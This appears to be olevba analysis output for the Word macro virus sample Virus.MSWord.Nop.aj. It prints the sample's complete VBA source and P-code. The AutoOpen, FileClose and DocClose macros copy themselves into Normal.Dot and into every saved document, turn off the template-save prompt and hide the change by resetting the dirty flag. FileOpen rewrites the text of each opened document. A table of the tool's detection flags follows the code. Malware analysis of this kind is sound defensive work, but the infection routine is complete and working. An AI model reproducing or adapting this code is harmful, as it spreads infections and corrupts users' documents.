olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nop.aj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nop.aj - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO HelpAbout.bas 
in file: Virus.MSWord.Nop.aj - OLE stream: 'Macros/VBA/HelpAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ===============================================================
Rem Some Joke from this Macro.
Rem ===============================================================



Public Sub MAIN()
Attribute MAIN.VB_Description = "Отображает информацию о программе и номер версии"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.HelpAbout.MAIN"

On Error GoTo -1: On Error GoTo Halt

WordBasic.HelpAbout APPNAME:="Sucks!"

Halt:
Err.Number = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Nop.aj - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ==============================================================
Rem Invecting module of this Macro.
Rem ==============================================================



Public Sub MAIN()
Attribute MAIN.VB_Description = "Закрывает все окна активного документа"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
Dim W
Dim N$
Dim S$

On Error GoTo -1: On Error GoTo Halt

W = WordBasic.IsDocumentDirty()
Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs Dlg
If Dlg.Format <= 1 Then
    If Dlg.Format = 0 Then
        Dlg.Format = 1
        WordBasic.FileSaveAs Dlg
    End If
    N$ = "Normal.Dot:"
    S$ = Dlg.Name + ":"
    WordBasic.MacroCopy N$ + "FileClose", S$ + "FileClose", 1
    WordBasic.MacroCopy N$ + "DocClose", S$ + "DocClose", 1
    WordBasic.MacroCopy N$ + "FileOpen", S$ + "FileOpen", 1
    WordBasic.MacroCopy N$ + "HelpAbout", S$ + "HelpAbout", 1
    WordBasic.MacroCopy N$ + "Internal", S$ + "AutoOpen", 1
    WordBasic.SetDocumentDirty W
End If


Halt:
Err.Number = 0
WordBasic.FileClose

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Nop.aj - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ==================================================================
Rem Destructive operations from this Macro.
Rem ==================================================================



Public Sub MAIN()
Attribute MAIN.VB_Description = "Открывает существующий документ или шаблон"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"

On Error GoTo -1: On Error GoTo Halt

Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen Dlg
WordBasic.Dialog.FileOpen Dlg
WordBasic.FileOpen Dlg

WordBasic.EditReplace Find:="Windows", Replace:="Sucks must die!", ReplaceAll:=1

Halt:
Err.Number = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO DocClose.bas 
in file: Virus.MSWord.Nop.aj - OLE stream: 'Macros/VBA/DocClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ==============================================================
Rem Invecting module of this Macro.
Rem ==============================================================



Public Sub MAIN()
Attribute MAIN.VB_Description = "Предлагает сохранить активный документ и закрывает активное окно"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DocClose.MAIN"
Dim W
Dim N$
Dim S$

On Error GoTo -1: On Error GoTo Halt

W = WordBasic.IsDocumentDirty()
Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs Dlg
If Dlg.Format <= 1 Then
    If Dlg.Format = 0 Then
        Dlg.Format = 1
        WordBasic.FileSaveAs Dlg
    End If
    N$ = "Normal.Dot:"
    S$ = Dlg.Name + ":"
    WordBasic.MacroCopy N$ + "FileClose", S$ + "FileClose", 1
    WordBasic.MacroCopy N$ + "DocClose", S$ + "DocClose", 1
    WordBasic.MacroCopy N$ + "FileOpen", S$ + "FileOpen", 1
    WordBasic.MacroCopy N$ + "HelpAbout", S$ + "HelpAbout", 1
    WordBasic.MacroCopy N$ + "Internal", S$ + "AutoOpen", 1
    WordBasic.SetDocumentDirty W
End If


Halt:
Err.Number = 0
WordBasic.DocClose

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nop.aj - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem =================================================================
Rem StartUp Initialization.
Rem =================================================================



Public Sub MAIN()
Dim N$
Dim S$

On Error GoTo -1: On Error GoTo Halt

Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.ToolsOptionsSave(False)
WordBasic.CurValues.ToolsOptionsSave Dlg
Dlg.GlobalDotPrompt = 0
WordBasic.ToolsOptionsSave Dlg
If WordBasic.[MacroFileName$]("Internal") = "" Then
    N$ = "Normal.Dot:"
    S$ = WordBasic.[FileNameFromWindow$]() + ":"
    WordBasic.MacroCopy S$ + "FileClose", N$ + "FileClose", 1
    WordBasic.MacroCopy S$ + "DocClose", N$ + "DocClose", 1
    WordBasic.MacroCopy S$ + "FileOpen", N$ + "FileOpen", 1
    WordBasic.MacroCopy S$ + "HelpAbout", N$ + "HelpAbout", 1
    WordBasic.MacroCopy S$ + "AutoOpen", N$ + "Internal", 1
End If

Halt:
Err.Number = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nop.aj
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/HelpAbout - 1692 bytes
' Line #0:
' Line #1:
' 	Rem 0x0040 " ==============================================================="
' Line #2:
' 	Rem 0x001B " Some Joke from this Macro."
' Line #3:
' 	Rem 0x0040 " ==============================================================="
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Public Sub MAIN())
' Line #8:
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Halt 
' Line #10:
' Line #11:
' 	LitStr 0x0006 "Sucks!"
' 	ParamNamed APPNAME 
' 	Ld WordBasic 
' 	ArgsMemCall HelpAbout 0x0001 
' Line #12:
' Line #13:
' 	Label Halt 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #15:
' 	EndSub 
' Macros/VBA/FileClose - 2877 bytes
' Line #0:
' Line #1:
' 	Rem 0x003F " =============================================================="
' Line #2:
' 	Rem 0x0020 " Invecting module of this Macro."
' Line #3:
' 	Rem 0x003F " =============================================================="
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Public Sub MAIN())
' Line #8:
' 	Dim 
' 	VarDefn W
' Line #9:
' 	Dim 
' 	VarDefn N
' Line #10:
' 	Dim 
' 	VarDefn S
' Line #11:
' Line #12:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Halt 
' Line #13:
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd IsDocumentDirty 0x0000 
' 	St W 
' Line #15:
' 	Dim 
' 	VarDefn Dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set Dlg 
' Line #16:
' 	Ld Dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #17:
' 	Ld Dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Le 
' 	IfBlock 
' Line #18:
' 	Ld Dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld Dlg 
' 	MemSt Format$ 
' Line #20:
' 	Ld Dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	LitStr 0x000B "Normal.Dot:"
' 	St N$ 
' Line #23:
' 	Ld Dlg 
' 	MemLd New 
' 	LitStr 0x0001 ":"
' 	Add 
' 	St S$ 
' Line #24:
' 	Ld N$ 
' 	LitStr 0x0009 "FileClose"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0009 "FileClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #25:
' 	Ld N$ 
' 	LitStr 0x0008 "DocClose"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0008 "DocClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #26:
' 	Ld N$ 
' 	LitStr 0x0008 "FileOpen"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0008 "FileOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #27:
' 	Ld N$ 
' 	LitStr 0x0009 "HelpAbout"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0009 "HelpAbout"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #28:
' 	Ld N$ 
' 	LitStr 0x0008 "Internal"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #29:
' 	Ld W 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentDirty 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' Line #33:
' 	Label Halt 
' Line #34:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #35:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #36:
' Line #37:
' 	EndSub 
' Macros/VBA/FileOpen - 2062 bytes
' Line #0:
' Line #1:
' 	Rem 0x0043 " =================================================================="
' Line #2:
' 	Rem 0x0028 " Destructive operations from this Macro."
' Line #3:
' 	Rem 0x0043 " =================================================================="
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Public Sub MAIN())
' Line #8:
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Halt 
' Line #10:
' Line #11:
' 	Dim 
' 	VarDefn Dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set Dlg 
' Line #12:
' 	Ld Dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #13:
' 	Ld Dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #14:
' 	Ld Dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #15:
' Line #16:
' 	LitStr 0x0007 "Windows"
' 	ParamNamed Find 
' 	LitStr 0x000F "Sucks must die!"
' 	ParamNamed Replace 
' 	LitDI2 0x0001 
' 	ParamNamed ReplaceAll 
' 	Ld WordBasic 
' 	ArgsMemCall EditReplace 0x0003 
' Line #17:
' Line #18:
' 	Label Halt 
' Line #19:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #20:
' 	EndSub 
' Macros/VBA/DocClose - 2924 bytes
' Line #0:
' Line #1:
' 	Rem 0x003F " =============================================================="
' Line #2:
' 	Rem 0x0020 " Invecting module of this Macro."
' Line #3:
' 	Rem 0x003F " =============================================================="
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Public Sub MAIN())
' Line #8:
' 	Dim 
' 	VarDefn W
' Line #9:
' 	Dim 
' 	VarDefn N
' Line #10:
' 	Dim 
' 	VarDefn S
' Line #11:
' Line #12:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Halt 
' Line #13:
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd IsDocumentDirty 0x0000 
' 	St W 
' Line #15:
' 	Dim 
' 	VarDefn Dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set Dlg 
' Line #16:
' 	Ld Dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #17:
' 	Ld Dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Le 
' 	IfBlock 
' Line #18:
' 	Ld Dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld Dlg 
' 	MemSt Format$ 
' Line #20:
' 	Ld Dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	LitStr 0x000B "Normal.Dot:"
' 	St N$ 
' Line #23:
' 	Ld Dlg 
' 	MemLd New 
' 	LitStr 0x0001 ":"
' 	Add 
' 	St S$ 
' Line #24:
' 	Ld N$ 
' 	LitStr 0x0009 "FileClose"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0009 "FileClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #25:
' 	Ld N$ 
' 	LitStr 0x0008 "DocClose"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0008 "DocClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #26:
' 	Ld N$ 
' 	LitStr 0x0008 "FileOpen"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0008 "FileOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #27:
' 	Ld N$ 
' 	LitStr 0x0009 "HelpAbout"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0009 "HelpAbout"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #28:
' 	Ld N$ 
' 	LitStr 0x0008 "Internal"
' 	Add 
' 	Ld S$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #29:
' 	Ld W 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentDirty 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' Line #33:
' 	Label Halt 
' Line #34:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #35:
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0000 
' Line #36:
' Line #37:
' 	EndSub 
' Macros/VBA/AutoOpen - 2908 bytes
' Line #0:
' Line #1:
' 	Rem 0x0042 " ================================================================="
' Line #2:
' 	Rem 0x0018 " StartUp Initialization."
' Line #3:
' 	Rem 0x0042 " ================================================================="
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Public Sub MAIN())
' Line #8:
' 	Dim 
' 	VarDefn N
' Line #9:
' 	Dim 
' 	VarDefn S
' Line #10:
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Halt 
' Line #12:
' Line #13:
' 	Dim 
' 	VarDefn Dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsOptionsSave 0x0001 
' 	Set Dlg 
' Line #14:
' 	Ld Dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #15:
' 	LitDI2 0x0000 
' 	Ld Dlg 
' 	MemSt GlobalDotPrompt 
' Line #16:
' 	Ld Dlg 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #17:
' 	LitStr 0x0008 "Internal"
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #18:
' 	LitStr 0x000B "Normal.Dot:"
' 	St N$ 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameFromWindow$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	St S$ 
' Line #20:
' 	Ld S$ 
' 	LitStr 0x0009 "FileClose"
' 	Add 
' 	Ld N$ 
' 	LitStr 0x0009 "FileClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #21:
' 	Ld S$ 
' 	LitStr 0x0008 "DocClose"
' 	Add 
' 	Ld N$ 
' 	LitStr 0x0008 "DocClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #22:
' 	Ld S$ 
' 	LitStr 0x0008 "FileOpen"
' 	Add 
' 	Ld N$ 
' 	LitStr 0x0008 "FileOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #23:
' 	Ld S$ 
' 	LitStr 0x0009 "HelpAbout"
' 	Add 
' 	Ld N$ 
' 	LitStr 0x0009 "HelpAbout"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #24:
' 	Ld S$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Add 
' 	Ld N$ 
' 	LitStr 0x0008 "Internal"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	Label Halt 
' Line #28:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #29:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

